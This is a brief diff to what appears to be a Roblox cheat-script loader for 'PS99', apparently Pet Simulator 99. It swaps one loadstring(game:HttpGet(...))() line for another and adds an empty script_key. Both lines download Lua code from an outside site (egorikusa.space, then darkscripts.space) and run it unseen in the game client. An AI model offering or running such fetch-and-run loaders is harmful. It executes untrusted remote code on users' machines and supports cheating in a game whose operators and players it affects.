@@ -1,4 +1,3 @@
-# PS99-Script 
+--script_key=""
 
-
-loadstring(game:HttpGet("https://egorikusa.space/b496f8e694256144cccb80eb.lua", true))()
+loadstring(game:HttpGet('https://darkscripts.space/scripts/8ff2db85b8.lua',true))()
